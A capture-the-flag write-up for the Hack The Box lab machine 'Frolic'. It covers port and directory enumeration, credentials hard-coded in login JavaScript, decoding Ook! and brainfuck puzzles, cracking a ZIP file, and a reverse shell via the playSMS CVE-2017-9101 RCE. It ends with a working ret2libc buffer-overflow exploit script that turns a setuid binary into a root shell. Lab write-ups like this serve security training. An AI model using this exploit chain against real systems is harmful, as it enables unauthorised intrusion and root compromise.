## Default Information
IP Address: 10.10.10.111\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.111    frolic.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.111 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-10-02 01:05:16 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.111
Discovered open port 137/tcp on 10.10.10.111
Discovered open port 139/tcp on 10.10.10.111
Discovered open port 445/tcp on 10.10.10.111
Discovered open port 1880/tcp on 10.10.10.111
Discovered open port 9999/tcp on 10.10.10.111
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port. From the output, there are 2 ports with web services, namely port 1880 and port 9999.

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | Open |
| 139	| netbios-ssn | Samba smbd 3.X - 4.X | Open |
| 445	| netbios-ssn | Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) | Open |
| 1880	| http | Node.js (Express middleware) | Open |
| 9999	| http | nginx 1.10.3 (Ubuntu) | Open |

Afterwwards, we will use Nmap to scan for potential vulnerabilties on each of the ports, but the main exploits are DDOS, which is not very useful in our case.

### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://frolic.htb:9999 and http://frolic.htb:1880

```
http://frolic.htb:1880/red                  (Status: 301) [Size: 173] [--> /red/]
http://frolic.htb:1880/vendor               (Status: 301) [Size: 179] [--> /vendor/]
http://frolic.htb:1880/settings             (Status: 401) [Size: 12]
http://frolic.htb:1880/Icons                (Status: 401) [Size: 12]
http://frolic.htb:1880/nodes                (Status: 401) [Size: 12]
http://frolic.htb:1880/SETTINGS             (Status: 401) [Size: 12]
http://frolic.htb:1880/flows                (Status: 401) [Size: 12]
http://frolic.htb:1880/ICONS                (Status: 401) [Size: 12]
http://frolic.htb:9999/admin                (Status: 301) [Size: 194] [--> http://frolic.htb:9999/admin/]
http://frolic.htb:9999/test                 (Status: 301) [Size: 194] [--> http://frolic.htb:9999/test/]
http://frolic.htb:9999/dev                  (Status: 301) [Size: 194] [--> http://frolic.htb:9999/dev/]
http://frolic.htb:9999/backup               (Status: 301) [Size: 194] [--> http://frolic.htb:9999/backup/]
http://frolic.htb:9999/loop                 (Status: 301) [Size: 194] [--> http://frolic.htb:9999/loop/]
http://frolic.htb:1880/icons                (Status: 401) [Size: 12]
```

### Ferox Buster
```
http://10.10.10.111:1880/favicon.ico
http://10.10.10.111:1880/flows
http://10.10.10.111:1880/icons
http://10.10.10.111:1880/red
http://10.10.10.111:1880/settings
http://10.10.10.111:1880/vendor
http://10.10.10.111:9999/admin
http://10.10.10.111:9999/backup
http://10.10.10.111:9999/cgi-bin/.html
http://10.10.10.111:9999/dev
http://10.10.10.111:9999/.git/logs/.html
http://10.10.10.111:9999/.hta
http://10.10.10.111:9999/.hta.asp
http://10.10.10.111:9999/.hta.aspx
http://10.10.10.111:9999/.htaccess
http://10.10.10.111:9999/.htaccess.asp
http://10.10.10.111:9999/.htaccess.aspx
http://10.10.10.111:9999/.htaccess.html
http://10.10.10.111:9999/.htaccess.jsp
http://10.10.10.111:9999/.htaccess.txt
http://10.10.10.111:9999/.hta.html
http://10.10.10.111:9999/.hta.jsp
http://10.10.10.111:9999/.hta.txt
http://10.10.10.111:9999/.htpasswd
http://10.10.10.111:9999/.htpasswd.asp
http://10.10.10.111:9999/.htpasswd.aspx
http://10.10.10.111:9999/.htpasswd.html
http://10.10.10.111:9999/.htpasswd.jsp
http://10.10.10.111:9999/.htpasswd.txt
http://10.10.10.111:9999/test
```

### Web-content discovery

On visiting http://frolic.htb:999/admin/, we are greeted with a login page, and viewing the source code brings us to http://frolic.htb:9999/admin/js/login.js, where we can find the credentials of the username and password to login to the page.

```js
var attempt = 3; // Variable to count number of attempts.
// Below function Executes on click of login button.
function validate(){
var username = document.getElementById("username").value;
var password = document.getElementById("password").value;
if ( username == "admin" && password == "superduperlooperpassword_lol"){
alert ("Login successfully");
window.location = "success.html"; // Redirecting to other page.
return false;
}
else{
attempt --;// Decrementing by one.
alert("You have left "+attempt+" attempt;");
// Disabling fields after 3 attempts.
if( attempt == 0){
document.getElementById("username").disabled = true;
document.getElementById("password").disabled = true;
document.getElementById("submit").disabled = true;
return false;
}
}
}
```

Visiting http://frolic.htb:9999/test/, we are able to view the phpmyinfo page, which we will look into much later.

## Exploit
Apart from that, http://frolic.htb:9999/backup/, gives us 3 directories/file names. Out of which, ```password.txt``` is accessible. Visitng http://frolic.htb:9999/backup/password.txt, we are able to obtain the following text:

```
password - imnothuman
```

### Decoding Ook
Using the username and password that we have obtained from http://frolic.htb/admin/js/login.js, we will now login to http:/frolic.htb/admin/. Upon logging in, we are presented with a long text of weird characters
```
..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?. 
```

After some research, this belongs to an [Esoteric programming languge](https://en.wikipedia.org/wiki/Esoteric_programming_language) known as Ook! Decoding this weird text, we get the following plaintext

```
Nothing here check /asdiSIAJJ0QWE9JAS
```

### Bruteforcing ZIP file
Visiting http://frolic.htb:9999//asdiSIAJJ0QWE9JAS, we obtain another text of weird string which we identify to be base64 encoded. Upon decoding the text, we obtain some unreadable output. However ```PK``` in the decoded text suggests that this may decode to be the binary for a ZIP file extension.

```
┌──(kali㉿kali)-[~]
└─$ echo "UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA" | base64 --d
PK     É7M#�[�i index.phpUT     �|�[�|�[ux
                                          ^D�J�s�h�)�P�n
                                                        ��Ss�Jw▒܎��4��k�z��UȖ�+X��P��ᶇ��л�x_�N�[���S��8�����J2S�*�DЍ}�8dTQk������j_���▒���'xc��ݏt��75Q�
                                                          ���k,4��b)�4F��       ���������&q2o�WԜ�9P#�[�iPK  É7M#�[�i ▒��index.phpUT�|�[ux
                                            PKO  
```

Analysing the decoded text with xxd furthur proves our suspicious. From the binary text, we are also able to know that the file probably contains index.php file.

```
┌──(kali㉿kali)-[~]
└─$ echo "UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA" | base64 --d | xxd
00000000: 504b 0304 1400 0900 0800 c389 374d 23fe  PK..........7M#.
00000010: 5b14 b000 0000 6902 0000 0900 1c00 696e  [.....i.......in
00000020: 6465 782e 7068 7055 5409 0003 857c a75b  dex.phpUT....|.[
00000030: 857c a75b 7578 0b00 0104 0000 0000 0400  .|.[ux..........
00000040: 0000 005e 44e6 104a 9f73 b268 8a29 9a1b  ...^D..J.s.h.)..
00000050: 9550 f06e 0ba9 bf53 73e4 024a 771a 11dc  .P.n...Ss..Jw...
00000060: 8ee5 a034 e2f6 d98f 6bee 7ad0 128a 55c8  ...4....k.z...U.
00000070: 96ec 2b58 ba7f e050 c8e1 12e1 b687 a4ea  ..+X...P........
00000080: d0bb e278 5f13 c04e 895b fd8d 8453 aaea  ...x_..N.[...S..
00000090: 38f2 83f2 e20f 914a 3253 c72a 8303 44d0  8......J2S.*..D.
000000a0: 8d7d 9338 6454 0e51 026b de10 cad7 e3e4  .}.8dT.Q.k......
000000b0: fb6a 5f9f 8bf9 18e9 94c0 2778 7f63 90c2  .j_.......'x.c..
000000c0: 16dd 8f74 beb2 3735 51ac 0b9a 8a03 0e95  ...t..75Q.......
000000d0: 106b 032c 34b5 d962 29be 3446 b5e9 0609  .k.,4..b).4F....
000000e0: ffba 84e3 96ea e9ef c726 7132 6f88 57d4  .........&q2o.W.
000000f0: 9ce3 3950 4b07 0823 fe5b 14b0 0000 0069  ..9PK..#.[.....i
00000100: 0200 0050 4b01 021e 0314 0009 0008 00c3  ...PK...........
00000110: 8937 4d23 fe5b 14b0 0000 0069 0200 0009  .7M#.[.....i....
00000120: 0018 0000 0000 0001 0000 00a4 8100 0000  ................
00000130: 0069 6e64 6578 2e70 6870 5554 0500 0385  .index.phpUT....
00000140: 7ca7 5b75 780b 0001 0400 0000 0004 0000  |.[ux...........
00000150: 0000 504b 0506 0000 0000 0100 0100 4f00  ..PK..........O.
00000160: 0000 0301 0000 0000                      ........                                                          
```

Now, we will save the decoded data as a ZIP file. However, we realize that the ZIP file is password-protected.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ echo "UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA" | base64 -d > frolic.zip 
                                                                                             
┌──(kali㉿kali)-[~/Desktop]
└─$ file frolic.zip
frolic.zip: Zip archive data, at least v2.0 to extract

┌──(kali㉿kali)-[~/Desktop]
└─$ unzip frolic.zip
Archive:  frolic.zip
[frolic.zip] index.php password: 
   skipping: index.php               incorrect password                                                    
```

Now, we will use fcrazip to obtain the password for the ZIP file.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ fcrackzip -u -D -p rockyou.txt frolic.zip                                            1 ⨯


PASSWORD FOUND!!!!: pw == password
```

### Decoding brain-fuck
Viewing the index.php file, we are presented with another text of weird string that looks to be hexadecimal encoded. All we have to do is to decode the hexadecimal to ASCII text. However, the ASCII text is actually base64 encoded, so we would have to decode it with base64.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ echo "4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a" | xxd -p -r
KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr
KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg
K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t
LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==
┌──(kali㉿kali)-[~]
└─$ echo "KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr
KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg
K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t
LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==" | base64 -d
+++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
++..<
```

The decoded text is another esoteric programming language known as brinfuck. Decoding this will give us a test ```idkwhatispass```, which seems like some sort of password. However, trying this on SSH server, FTP server and the web servers did not yield any results.

### Logging in to /playsms
However, furthur Gobuster enumeration of the endpoints ```/dev``` and ```/test``` produced furthur results.

```
http://frolic.htb:9999/dev/test                
http://frolic.htb:9999/dev/backup              
```

Visitng http://frolic.htb:9999/dev/test, we are able to download an ASCII file. However, this file is useless as it did not contain any information. However, visiting http://frolic.htb:9999/dev/backup, we are able to find a new endpoint /playsms

Visiting http:/frolic.htb:9999/playsms, we are greeted with a login screen to playSMS, which we realize that we can login with the admin:idkwhatispass.

### Obtaining reverse shell
From the site, we know that we are using playSMS version 1.4.5, which is vulnerable to CVE-2017-9101, which is an authenticated RCE via Phonebook import Function. We are also able to find the code for RCE on [Github](https://github.com/jasperla/CVE-2017-9101)

Executing the code, we will then be able to spawn a reverse shell.
![Obtaining reverse shell](https://github.com/joelczk/writeups/blob/main/HTB/Images/Frolic/reverse_shell.PNG)

### Obtaining user flag

```
www-data@frolic:/home/ayush$ cat user.txt
cat user.txt
<Redacted user flag>
```

### Finding the binary

Viewing the contents at /home/ayush, we notice that there is a weird directory called .binary

```
www-data@frolic:~/html/playsms$ ls -la /home/ayush
ls -la /home/ayush
total 36
drwxr-xr-x 3 ayush ayush 4096 Sep 25  2018 .
drwxr-xr-x 4 root  root  4096 Sep 23  2018 ..
-rw------- 1 ayush ayush 2781 Sep 25  2018 .bash_history
-rw-r--r-- 1 ayush ayush  220 Sep 23  2018 .bash_logout
-rw-r--r-- 1 ayush ayush 3771 Sep 23  2018 .bashrc
drwxrwxr-x 2 ayush ayush 4096 Sep 25  2018 .binary
-rw-r--r-- 1 ayush ayush  655 Sep 23  2018 .profile
-rw------- 1 ayush ayush  965 Sep 25  2018 .viminfo
-rwxr-xr-x 1 ayush ayush   33 Sep 25  2018 user.txt
```

Navigating to the directory, we are able to find a binary named rop (Hints of return-oriented programming from the name). From the file command, we also know that the binary is a 32-bit binary

```
www-data@frolic:/home/ayush/.binary$ ls -la
ls -la
total 16
drwxrwxr-x 2 ayush ayush 4096 Sep 25  2018 .
drwxr-xr-x 3 ayush ayush 4096 Sep 25  2018 ..
-rwsr-xr-x 1 root  root  7480 Sep 25  2018 rop
www-data@frolic:/home/ayush/.binary$ file rop
file rop
rop: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=59da91c100d138c662b77627b65efbbc9f797394, not stripped
www-data@frolic:/home/ayush/.binary$
```

### Analyzing binary

First, we have to run a checksec on the binary. From the output, we realize that NX is enabled which probably means that we are unable to execute the shellcode on the stack. Hence, we would need to use return-to-libc approach.

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

Next, let's check for the ASLR on the reverse shell, and it looks like ASLR is turned off. So, this safely means that we can analyze the binary on our local machine and generate the exploit

```
www-data@frolic:~/html/playsms$ cat /proc/sys/kernel/randomize_va_space         
cat /proc/sys/kernel/randomize_va_space
0
```

Next, let us find out the pattern offset to know the size of our stack. To do that we will have to first generate a pattern using msf and find out the address where the program breaks from gdb-peda. Afterwards, we will use msf again to find position at which the program breaks.

_msf console (Generate pattern and find offset)_
```
┌──(kali㉿kali)-[~/Desktop]
└─$ msf-pattern_create -l 500                                                            4 ⚙
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
                                                                                             
┌──(kali㉿kali)-[~/Desktop]
└─$ msf-pattern_offset -q 0x62413762                                                     4 ⚙
[*] Exact match at offset 52
```

_GDB Peda(Find address where the program breaks)_

```
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x62413762 in ?? ()
```

Lastly, all we have to do is to develop the exploit code

```python
import struct

def m32(offset):
	return struct.pack("I",offset)

padding = "A" * 52
base = 0xb7e19000
system = base + 0x0003ada0
exit = base + 0x0002e9d0
bin_sh = base + 0x15ba0b
exploit = padding + m32(system) + m32(exit) + m32(bin_sh)
print(exploit)
```
### Obtaining root flag

```
www-data@frolic:/home/ayush/.binary$ ./rop $(python /var/www/html/playsms/exploit.py)
t.py) $(python /var/www/html/playsms/exploi 
whoami
root
cat /root/root.txt
<Redacted root flag>
```
